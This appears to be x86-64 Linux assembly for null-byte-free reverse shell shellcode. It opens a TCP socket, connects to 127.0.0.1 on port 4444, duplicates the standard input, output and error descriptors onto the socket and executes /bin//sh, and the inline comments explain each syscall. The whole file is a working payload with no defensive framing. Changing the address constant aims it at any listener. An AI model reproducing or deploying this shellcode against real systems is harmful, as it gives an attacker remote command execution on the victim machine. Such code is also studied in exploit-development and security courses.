global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41


        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx

	mov al, 41

        inc rdi
        inc rdi

        inc rsi

	syscall

	; copy socket descriptor to rdi for future use

	mov rdi, rax


	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rdx, rdx
        xor rbp, rbp

        push word 0x2
        pop bp

	push rdx

	mov dword [rsp-4], 0x0101017f
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], bp
	sub rsp, 8

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)

	mov al, 42
	mov rsi, rsp
	mov dl, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)

	mov al, 33

        xor rsi, rsi

        syscall

        mov al, 33

        inc rsi

        syscall

        mov al, 33

        inc rsi

        syscall


        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
